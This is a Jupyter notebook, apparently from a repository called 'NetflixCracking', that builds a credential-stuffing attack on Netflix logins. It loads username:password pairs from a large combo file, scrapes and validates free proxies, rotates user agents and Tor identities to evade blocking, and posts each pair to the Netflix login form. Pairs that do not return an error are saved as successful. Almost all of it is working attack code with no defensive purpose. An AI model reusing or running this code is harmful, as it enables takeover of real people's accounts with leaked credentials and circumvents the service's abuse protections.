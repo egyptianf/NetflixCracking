{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "from selenium.webdriver.common.proxy import Proxy, ProxyType"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "# Usernames and passwords pool\n",
    "fname = '/home/nerdo/Downloads/4.55M.txt'\n",
    "names = []\n",
    "passes = []\n",
    "with open(fname, 'r') as file:\n",
    "    for i in range(100000):\n",
    "        line = file.readline().strip()\n",
    "        names.append(line.split(':')[0])\n",
    "        passes.append(line.split(':')[1])\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Read the proxy file and create a proxy pool\n",
    "pfname = '/home/nerdo/Downloads/proxy-list.txt'\n",
    "proxies = []\n",
    "with open(pfname, 'r') as pfile:\n",
    "    lines = pfile.readlines()\n",
    "    for line in lines:\n",
    "        line = line.strip()\n",
    "        if line[-3] == 'S':\n",
    "            proxies.append(line.split(\" \")[0])\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ChangeProxy(ProxyHost ,ProxyPort):\n",
    "    #\"Define Firefox Profile with you ProxyHost and ProxyPort\"\n",
    "    profile = webdriver.FirefoxProfile()\n",
    "    profile.set_preference(\"network.proxy.type\", 1)\n",
    "    profile.set_preference(\"network.proxy.http\", ProxyHost )\n",
    "    profile.set_preference(\"network.proxy.https\", ProxyHost )\n",
    "    profile.set_preference(\"network.proxy.http_port\", int(ProxyPort))\n",
    "    profile.set_preference(\"network.proxy.https_port\", int(ProxyPort))\n",
    "    profile.set_preference(\"network.proxy.ssl\",ProxyHost)\n",
    "    profile.set_preference(\"network.proxy.ssl_port\",int(ProxyPort))  \n",
    "    profile.set_preference(\"network.proxy.ftp\",ProxyHost)\n",
    "    profile.set_preference(\"network.proxy.ftp_port\",int(ProxyPort))   \n",
    "    profile.set_preference(\"network.proxy.socks\",ProxyHost)\n",
    "    profile.set_preference(\"network.proxy.socks_port\",int(ProxyPort))\n",
    "    profile.update_preferences()\n",
    "    return webdriver.Firefox(firefox_profile=profile)\n",
    "\n",
    "def tryProxy(_proxy):\n",
    "    ProxyHost, ProxyPort = _proxy.split(':')\n",
    "    driver = ChangeProxy(ProxyHost ,ProxyPort)\n",
    "    try:\n",
    "        driver.set_page_load_timeout(10)\n",
    "        driver.get(\"https://whatismyipaddress.com\")\n",
    "    except:\n",
    "        print(\"Time Out. Your proxy seems to be malfunctioning...\")\n",
    "        driver.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "tryProxy('107.150.50.126:80')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Testing proxy list\n",
    "proxies_len = len(proxies)\n",
    "for i in range(5):\n",
    "    tryProxy(proxies[i])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Testing another proxy pool\n",
    "new_pfname = '/home/nerdo/Downloads/Proxy-List.txt'\n",
    "new_proxies = []\n",
    "with open(new_pfname, 'r') as new_pfile:\n",
    "    lines = new_pfile.readlines()\n",
    "    for line in lines:\n",
    "        line = new_proxies.append(line.strip())\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "successfulNames = []\n",
    "successfulPasswords = []"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Netflix using Selenium"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Netflix\n",
    "\n",
    "\n",
    "#capabilities = changeProxy()\n",
    "\n",
    "url = \"https://www.netflix.com/login\"\n",
    "driver = webdriver.Firefox()\n",
    "driver.get(url)\n",
    "#time.sleep(10)\n",
    "driver.implicitly_wait(10)\n",
    "length = len(names)\n",
    "\n",
    "\n",
    "for i in range(2):\n",
    "    driver.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 't')\n",
    "    driver.get(url)\n",
    "    name = names[i]\n",
    "    password = passes[i]\n",
    "    \n",
    "    usernameBox = driver.find_element_by_xpath(\".//*[@id='id_userLoginId']\")\n",
    "    usernameBox.send_keys(name)\n",
    "    passwordBox = driver.find_element_by_xpath(\".//*[@id='id_password']\")\n",
    "    passwordBox.send_keys(password)\n",
    "    #signinButton = driver.find_element_by_xpath(\".//*[@class='btn.login-button']\")\n",
    "    signinButton = driver.find_element_by_class_name('btn.login-button')\n",
    "    signinButton.send_keys(Keys.RETURN)\n",
    "    \n",
    "    \n",
    "    driver.implicitly_wait(4)\n",
    "    # Failing element\n",
    "    failngClass = 'ui-message-contents'\n",
    "    failingElement = driver.find_element_by_xpath(\".//*[@class='\"+failngClass+\"']\")\n",
    "    if failingElement is None:\n",
    "        successfulNames.append(name)\n",
    "        successfulPasswords.append(password)\n",
    "    \n",
    "    \n",
    "    driver.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 'w')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Netflix using Requests library"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Trying things out with Request Library (This is much faster than Selenium)\n",
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "import random\n",
    "from itertools import cycle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# A pool of useragents to randomly select from\n",
    "with open('useragents2.txt', 'r') as userAgentsFile:\n",
    "    useragents = userAgentsFile.readlines()\n",
    "    useragents = [useragent.strip() for useragent in useragents]\n",
    "useragents = set(useragents)\n",
    "useragents = cycle(useragents)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "headers = {\n",
    "    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "def isValidProxy(_proxySocket):\n",
    "    url = 'https://httpbin.org/ip'\n",
    "    _proxies = {\n",
    "        \"http\": _proxySocket, \n",
    "        \"https\": _proxySocket\n",
    "    }\n",
    "    try:\n",
    "        response = requests.get(url, proxies=_proxies,timeout=10)\n",
    "    except requests.exceptions.Timeout:\n",
    "        print(\"Time out.\")\n",
    "        return False\n",
    "    except requests.exceptions.ConnectionError:\n",
    "        print(\"Connection error with the proxy or the url\")\n",
    "        return False\n",
    "    except requests.exceptions.RequestException:\n",
    "        print(\"Some error occurred.\")\n",
    "        return False\n",
    "    return True"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def createProxyDicts(_proxies):\n",
    "    _proxyDicts = []\n",
    "    for proxy in _proxies:\n",
    "        proxyDict = {\n",
    "            'http': 'http://' + proxy,\n",
    "            'https': 'https://' + proxy\n",
    "        }\n",
    "        _proxyDicts.append(proxyDict)\n",
    "    return _proxyDicts\n",
    "proxyDicts = createProxyDicts(validProxies)\n",
    "proxyDicts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# List of country codes\n",
    "import json\n",
    "countriesJsonFile = '/home/nerdo/countries.json'\n",
    "countriesList = set()\n",
    "with open(countriesJsonFile, 'r') as countriesFile:\n",
    "    countriesDict = json.load(countriesFile)\n",
    "for ele in countriesDict:\n",
    "    line = ele['alpha2']+':'\n",
    "    if len(ele['countryCallingCodes']) > 0:\n",
    "        line += ele['countryCallingCodes'][0]\n",
    "    countriesList.add(line)\n",
    "countries = cycle(countriesList)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "username = names[0]\n",
    "password = passes[0]\n",
    "\n",
    "testCountry = next(countries)\n",
    "testCountryCode = testCountry.split(\":\")[0]\n",
    "testCountryIsoCode = testCountry.split(\":\")[1]\n",
    "def createPayload(_username, _password, _countryCode='', _countryIsoCode=''):\n",
    "    payload = {\n",
    "        'userLoginId': _username,\n",
    "        'password': _password,\n",
    "        'rememberMe': 'true',\n",
    "        'flow': 'websiteSignUp',\n",
    "        'mode': 'login',\n",
    "        'action': 'loginAction',\n",
    "        'nextPage': '',\n",
    "        'showPassword': '',\n",
    "        'countryCode': _countryCode,\n",
    "        'countryIsoCode': _countryIsoCode,\n",
    "        'recaptchaResponseToken': '',\n",
    "        'recaptchaError': 'LOAD_TIMED_OUT'\n",
    "    }\n",
    "    return payload\n",
    "\n",
    "def getCountryCodes(_countryCodeString):\n",
    "    return _countryCodeString.split(\":\")[0], _countryCodeString.split(\":\")[1]\n",
    "\n",
    "\n",
    "reservedPhrases = ['incorrect password. please try again or', \"sorry, we can't find an account with this email address.\",\n",
    "                  'we are having technical difficulties and are actively working on a fix. please try again in a few minutes']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "names[2000]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "# Performing through a proxy pool\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "successfulNames=[]\n",
    "successfulPasswords=[]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%time\n",
    "proxyDict = proxyDicts[0]\n",
    "for i in range(2):\n",
    "    # Change proxy every 20 accounts\n",
    "    if (i+1)%20 == 0:\n",
    "        print('Changing proxy server...')\n",
    "        proxyDict = random.choice(proxyDicts)\n",
    "    \n",
    "    name = names[i+100]\n",
    "    password = passes[i+100]\n",
    "    countryCode, countryIsoCode = getCountryCodes(next(countries))\n",
    "    payload = createPayload(name, password, countryCode, countryIsoCode)\n",
    "    headers['User-Agent'] = next(useragents)\n",
    "    # Session should be opend just once\n",
    "    # Need to edit this code, look at: https://realpython.com/python-concurrency/#synchronous-version\n",
    "    with requests.Session() as s:\n",
    "        url = 'https://www.netflix.com/login'\n",
    "        s.proxies = proxyDict\n",
    "        try:\n",
    "            r = s.get(url, headers=headers, timeout=10)\n",
    "            soup = BeautifulSoup(r.content, 'html5lib')\n",
    "            if soup.find('input', attrs={'name': 'authURL'}) is not None:\n",
    "                payload['authURL'] = soup.find('input', attrs={'name': 'authURL'})['value']\n",
    "                if soup.find('input', attrs={'name': 'withFields'}) is not None:\n",
    "                    payload['withFields'] = soup.find('input', attrs={'name': 'withFields'})['value']\n",
    "            else:\n",
    "                print('No authURL div appeared. Means that this is not the ordinary login page. Might be an error page')\n",
    "                continue\n",
    "        except requests.exceptions.Timeout:\n",
    "            print('Account '+str(i)+ ' timed out.')\n",
    "        except requests.exceptions.RequestException as e:\n",
    "            raise SystemExit(e)\n",
    "        r = s.post(url, data=payload, headers=headers)\n",
    "        soup = BeautifulSoup(r.content, 'html5lib')\n",
    "        errorBox = soup.find('a', attrs={'href': '/loginHelp'})\n",
    "        divs = soup.find_all('div', attrs={'class':'ui-message-contents'})\n",
    "        if divs is not None and len(divs) > 0:\n",
    "            div = divs[1].text.lower()\n",
    "            print(str(i) + '. for:',name, 'and:', password,' ERROR: ' +div)\n",
    "        else:\n",
    "            successfulNames.append(name)\n",
    "            successfulPasswords.append(password)\n",
    "        if reservedPhrases[0] in div or reservedPhrases[1] in div or reservedPhrases[2] in div:\n",
    "            continue\n",
    "        else:\n",
    "            successfulNames.append(name)\n",
    "            successfulPasswords.append(password)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "# Trying through a proxy website\n",
    "\n",
    "\n",
    "# Didn't work out because of request and response issues"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def insert (source_str, insert_str, pos):\n",
    "    return source_str[:pos]+insert_str+source_str[pos:]\n",
    "haha = insert('https://freeproxy.win', 'us5.', 8)\n",
    "haha"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "payload2 = {\n",
    "    'url': 'netflix.com/login',\n",
    "    'server': 'rnd'\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Using a site that provides us with proxies\n",
    "countryCode = 'UK'\n",
    "countryIsoCode = '+44'\n",
    "payload = createPayload(names[10], passes[10], countryCode, countryIsoCode)\n",
    "with requests.Session() as s:\n",
    "    url2 = 'https://freeproxy.win'\n",
    "    r = s.get(url2, headers=headers)\n",
    "    r = s.post(url2, data=payload2, headers=headers)\n",
    "    requestURL = r.url\n",
    "    soup = BeautifulSoup(r.content, 'html5lib')\n",
    "    with open('testNetflix.html', 'w') as testNetFile:\n",
    "        testNetFile.write(str(soup))\n",
    "    qString = r.url.split('?')[1].split('=')[1]\n",
    "    payload['q'] = qString\n",
    "    r = s.post(insert(r.url, 'us3.',7), data=payload, headers=headers)\n",
    "    soup = BeautifulSoup(r.content, 'html5lib')\n",
    "    divs = soup.find_all('div', attrs={'class':'ui-message-contents'})\n",
    "    with open('testNetflix.html', 'w') as testNetFile:\n",
    "        testNetFile.write(str(soup))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "len(validProxies)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "# # Yet another proxy list\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_proxies(link):  \n",
    "    response = requests.get(link)\n",
    "    soup = BeautifulSoup(response.text,\"html5lib\")\n",
    "    https_proxies = filter(lambda item: \"yes\" in item.text,\n",
    "                           soup.select(\"table.table tr\"))\n",
    "    for item in https_proxies:\n",
    "        yield \"{}:{}\".format(item.select_one(\"td\").text,\n",
    "                             item.select_one(\"td:nth-of-type(2)\").text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "135"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "text/plain": [
       "{'1.10.187.149:44976',\n",
       " '1.179.206.161:59033',\n",
       " '102.164.220.152:34336',\n",
       " '102.23.237.49:41014',\n",
       " '103.113.197.11:8080',\n",
       " '103.12.161.196:50514',\n",
       " '103.133.204.169:8080',\n",
       " '103.206.254.170:65103',\n",
       " '103.208.152.34:35817',\n",
       " '103.250.68.10:8080',\n",
       " '103.251.225.13:34052',\n",
       " '103.28.121.58:3128',\n",
       " '103.83.116.226:55443',\n",
       " '103.86.192.74:8080',\n",
       " '103.94.121.27:60109',\n",
       " '104.148.76.144:3128',\n",
       " '104.148.76.176:3128',\n",
       " '109.172.43.35:3129',\n",
       " '109.172.57.250:23500',\n",
       " '109.195.23.223:34031',\n",
       " '109.199.133.161:23500',\n",
       " '109.245.239.125:55311',\n",
       " '110.164.91.50:51065',\n",
       " '110.74.199.16:63141',\n",
       " '115.77.191.180:53281',\n",
       " '116.254.100.165:46675',\n",
       " '116.58.254.57:8080',\n",
       " '117.102.119.150:47704',\n",
       " '117.241.96.165:31892',\n",
       " '117.58.241.222:46021',\n",
       " '118.174.220.14:43473',\n",
       " '119.28.215.215:3023',\n",
       " '124.158.177.171:23500',\n",
       " '124.219.176.139:39589',\n",
       " '124.41.243.22:47894',\n",
       " '125.26.165.17:39947',\n",
       " '125.26.6.98:32385',\n",
       " '129.226.20.75:8080',\n",
       " '129.226.77.75:10000',\n",
       " '134.249.141.148:8080',\n",
       " '139.99.105.186:80',\n",
       " '14.207.60.105:3128',\n",
       " '14.98.113.169:44383',\n",
       " '144.76.214.153:1080',\n",
       " '144.76.214.156:1080',\n",
       " '154.117.181.34:52959',\n",
       " '163.172.190.160:8811',\n",
       " '165.16.174.20:55898',\n",
       " '168.205.222.49:57643',\n",
       " '170.82.253.146:53281',\n",
       " '172.254.124.231:3128',\n",
       " '173.217.255.36:33351',\n",
       " '175.100.5.52:58588',\n",
       " '176.110.121.90:21776',\n",
       " '177.46.141.143:37548',\n",
       " '178.134.155.82:48146',\n",
       " '178.135.49.22:3128',\n",
       " '178.57.89.142:54749',\n",
       " '18.136.144.138:3838',\n",
       " '181.117.176.236:61358',\n",
       " '181.118.167.104:80',\n",
       " '181.129.127.234:57985',\n",
       " '182.48.81.222:35305',\n",
       " '185.131.62.250:53281',\n",
       " '185.158.127.9:53281',\n",
       " '185.50.56.230:32231',\n",
       " '185.56.209.114:51386',\n",
       " '187.60.36.164:53597',\n",
       " '188.40.183.184:1080',\n",
       " '188.40.183.186:1080',\n",
       " '188.40.183.189:1080',\n",
       " '188.40.183.191:1080',\n",
       " '190.214.52.226:53281',\n",
       " '191.241.166.248:41288',\n",
       " '191.252.221.204:80',\n",
       " '192.140.91.253:34302',\n",
       " '192.41.71.204:3128',\n",
       " '192.41.71.221:3128',\n",
       " '192.92.205.132:80',\n",
       " '193.68.200.227:52825',\n",
       " '194.114.128.149:61213',\n",
       " '194.213.43.166:32422',\n",
       " '194.226.63.164:59691',\n",
       " '195.9.61.22:56099',\n",
       " '200.255.122.170:8080',\n",
       " '200.73.128.5:8080',\n",
       " '201.62.56.49:35816',\n",
       " '201.64.22.50:8081',\n",
       " '201.64.22.51:80',\n",
       " '202.165.47.26:8080',\n",
       " '203.189.150.223:53890',\n",
       " '210.48.204.134:46669',\n",
       " '212.115.224.71:53281',\n",
       " '222.121.116.26:40618',\n",
       " '27.50.18.42:23500',\n",
       " '27.72.61.48:48455',\n",
       " '31.129.253.30:40223',\n",
       " '31.14.131.32:3128',\n",
       " '36.67.89.179:65205',\n",
       " '36.91.48.186:8080',\n",
       " '41.217.217.60:36120',\n",
       " '45.229.193.109:8080',\n",
       " '45.234.200.18:53281',\n",
       " '45.33.90.184:8080',\n",
       " '45.71.108.18:46114',\n",
       " '46.151.254.7:53281',\n",
       " '46.235.53.26:3128',\n",
       " '49.128.178.22:45643',\n",
       " '5.202.181.163:8080',\n",
       " '51.158.111.242:8811',\n",
       " '61.9.82.34:36883',\n",
       " '75.80.242.9:41007',\n",
       " '77.252.26.71:57348',\n",
       " '78.8.45.68:8080',\n",
       " '79.137.254.51:33143',\n",
       " '79.137.44.85:3129',\n",
       " '80.187.140.26:8080',\n",
       " '85.237.46.168:54109',\n",
       " '88.149.203.30:46909',\n",
       " '88.99.10.248:1080',\n",
       " '88.99.10.249:1080',\n",
       " '88.99.10.251:1080',\n",
       " '88.99.10.252:1080',\n",
       " '88.99.10.253:1080',\n",
       " '88.99.10.254:1080',\n",
       " '89.107.56.41:3128',\n",
       " '89.250.221.106:53281',\n",
       " '91.106.86.212:8080',\n",
       " '91.192.4.162:8090',\n",
       " '91.195.156.241:3128',\n",
       " '91.203.114.74:48058',\n",
       " '91.206.210.54:33200',\n",
       " '91.225.229.140:53281',\n",
       " '91.243.161.68:49750',\n",
       " '96.9.69.164:53281'}"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#!pip install lxml\n",
    "generatorProxy = get_proxies('https://free-proxy-list.net/')\n",
    "proxylist = set(generatorProxy)\n",
    "proxyPool = cycle(proxylist)\n",
    "len(proxylist)\n",
    "proxylist"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "validProxies = set()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%time\n",
    "# Validate all proxies\n",
    "\n",
    "k=0\n",
    "for proxy in proxylist:\n",
    "    if k%10 == 0:\n",
    "        print(k)\n",
    "    k += 1\n",
    "    if isValidProxy(proxy):\n",
    "        validProxies.add(proxy)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "set()"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "validProxies"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Async version of validating proxies"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "import asyncio\n",
    "import aiohttp\n",
    "import time\n",
    "import aiohttp_proxy\n",
    "from aiohttp_proxy import ProxyConnector, ProxyType"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Async version of isValidProxy\n",
    "# https://realpython.com/python-concurrency/\n",
    "\n",
    "\n",
    "async def aIsValidProxy(_proxySocket):\n",
    "    _url = 'https://httpbin.org/ip'\n",
    "    _host, _port = _proxySocket.split(':')\n",
    "    _connector = ProxyConnector(proxy_type=ProxyType.HTTPS, host=_host, port=_port, rdns=True)\n",
    "    try:\n",
    "        clientTimeout = aiohttp.ClientTimeout(connect=10, sock_connect=10, sock_read=10)\n",
    "        async with aiohttp.request('GET', _url, connector=_connector, timeout=clientTimeout) as _response:\n",
    "            print(\"Response {0} has text: {1}\".format(_response.status, _proxySocket))\n",
    "        await _connector.close()\n",
    "    except asyncio.TimeoutError:\n",
    "        print(\"{} had a timeout.\".format(_proxySocket))\n",
    "        return await False\n",
    "    except Exception as e:\n",
    "        print(e,\"for {}\".format(_proxySocket))\n",
    "        return await False\n",
    "    return await True\n",
    "\n",
    "async def aValidateAllProxies(_proxylist):\n",
    "    # Opening one session to speedup connections\n",
    "    tasks = []\n",
    "    for proxy in _proxylist:\n",
    "        task = asyncio.ensure_future(aIsValidProxy(proxy))\n",
    "        tasks.append(task)\n",
    "    await asyncio.gather(*tasks, return_exceptions=True)\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "# Will run on the proxylist scraped from the website\n",
    "\n",
    "# Syntax will be this if this was plain Python\n",
    "\n",
    "    #asyncio.run(aValidateAllProxies(proxylist))\n",
    "\n",
    "\n",
    "# Since this is Jupyter (IPython), it should be like that\n",
    "# The problem is that jupyter (IPython) is already running an event loop\n",
    "# Look at this link: https://stackoverflow.com/a/55409674\n",
    "\n",
    "try:\n",
    "    loop = asyncio.get_running_loop()\n",
    "except RuntimeError:  # if cleanup: 'RuntimeError: There is no current event loop..'\n",
    "    loop = None\n",
    "\n",
    "    \n",
    "testproxylist = proxylist\n",
    "if loop and loop.is_running():\n",
    "    print('Async event loop already running')\n",
    "    start_time = time.time()\n",
    "    \n",
    "    \n",
    "    tsk = loop.create_task(aValidateAllProxies(testproxylist))\n",
    "    # ^-- https://docs.python.org/3/library/asyncio-task.html#task-object\n",
    "    tsk.add_done_callback(                                          # optional\n",
    "        lambda t: print(f'Task done: '                              # optional\n",
    "                        f'{t.result()=} << return val of aValidateAllProxies()'))  # optional (using py38)\n",
    "    \n",
    "    \n",
    "    duration = time.time() - start_time\n",
    "    print(f\"Tried {len(testproxylist)} proxies in {duration} seconds\")\n",
    "\n",
    "else:\n",
    "    print('Starting new event loop')\n",
    "    asyncio.run(aValidateAllProxies(proxylist))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "len(validProxies)\n",
    "proxylist\n",
    "asyncio.get_event_loop()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "proxySocket = '120.72.26.184:37553'\n",
    "if isValidProxy(proxySocket):\n",
    "    print('Valid Proxy')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%time\n",
    "# Filter valid proxies from my pools\n",
    "proxies.append(proxySocket)\n",
    "for proxy in proxies:\n",
    "    if isValidProxy(proxy):\n",
    "        validProxies.add(proxy)\n",
    "for proxy in new_proxies:\n",
    "    if isValidProxy(proxy):\n",
    "        validProxies.add(proxy)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "len(validProxies)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "# Requesting through Tor\n",
    "\n",
    "\n",
    "# Seems to be detected from Netflix"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Requsting through Tor\n",
    "from torrequest import TorRequest"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "dir(tr)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Testing\n",
    "with tr as s:\n",
    "        url = 'https://www.netflix.com/login'\n",
    "        r = s.get(url, headers=headers, timeout=10)\n",
    "        print(r.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "tr.reset_identity() #Reset Tor\n",
    "response = tr.get('http://ipecho.net/plain')\n",
    "print (\"New Ip Address\", response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def getIP(torSession):\n",
    "    _response = torSession.get('http://ipecho.net/plain')\n",
    "    return _response.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%time\n",
    "\n",
    "for i in range(0, 100):\n",
    "    name = names[i+150]\n",
    "    password = passes[i+150]\n",
    "    #import pdb; pdb.set_trace()\n",
    "    countryCode, countryIsoCode = getCountryCodes(countriesList[random.randint(0,len(countriesList))])\n",
    "    payload = createPayload(name, password, countryCode, countryIsoCode)\n",
    "    headers['User-Agent'] = useragents[random.randint(0, len(useragents))]\n",
    "    with TorRequest(password='torhashpassword') as tr:\n",
    "        # Change proxy every 20 accounts\n",
    "        if i%20 == 0:\n",
    "            print('Resetting Tor identity... The new IP is: ' + getIP(tr))\n",
    "            tr.reset_identity()\n",
    "        s = tr\n",
    "        url = 'https://www.netflix.com/login'\n",
    "        try:\n",
    "            r = s.get(url, headers=headers, timeout=10)\n",
    "            soup = BeautifulSoup(r.content, 'html5lib')\n",
    "            with open('testNetflix.html', 'w') as testNetFile:\n",
    "                testNetFile.write(str(soup))\n",
    "            if soup.find('input', attrs={'name': 'authURL'}) is not None:\n",
    "                payload['authURL'] = soup.find('input', attrs={'name': 'authURL'})['value']\n",
    "                if soup.find('input', attrs={'name': 'withFields'}) is not None:\n",
    "                    payload['withFields'] = soup.find('input', attrs={'name': 'withFields'})['value']\n",
    "            else:\n",
    "                continue\n",
    "        except requests.exceptions.Timeout:\n",
    "            print('Account '+str(i)+ ' timed out.')\n",
    "        except requests.exceptions.RequestException as e:\n",
    "            raise SystemExit(e)\n",
    "        r = s.post(url, data=payload, headers=headers)\n",
    "        soup = BeautifulSoup(r.content, 'html5lib')\n",
    "        errorBox = soup.find('a', attrs={'href': '/loginHelp'})\n",
    "        divs = soup.find_all('div', attrs={'class':'ui-message-contents'})\n",
    "        if divs is not None and len(divs) > 0:\n",
    "            div = divs[1].text.lower()\n",
    "            print(str(i) + '. for:',name, 'and:', password,' ERROR:' +div)\n",
    "        else:\n",
    "            successfulNames.append(name)\n",
    "            successfulPasswords.append(password)\n",
    "        if reservedPhrases[0] in div or reservedPhrases[1] in div or reservedPhrases[2] in div:\n",
    "            continue\n",
    "        else:\n",
    "            successfulNames.append(name)\n",
    "            successfulPasswords.append(password)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response= requests.get('http://ipecho.net/plain')\n",
    "print (\"My Original IP Address:\",response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.8.1 64-bit",
   "language": "python",
   "name": "python38164bit5736db31512345ee960d5073d473fb78"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
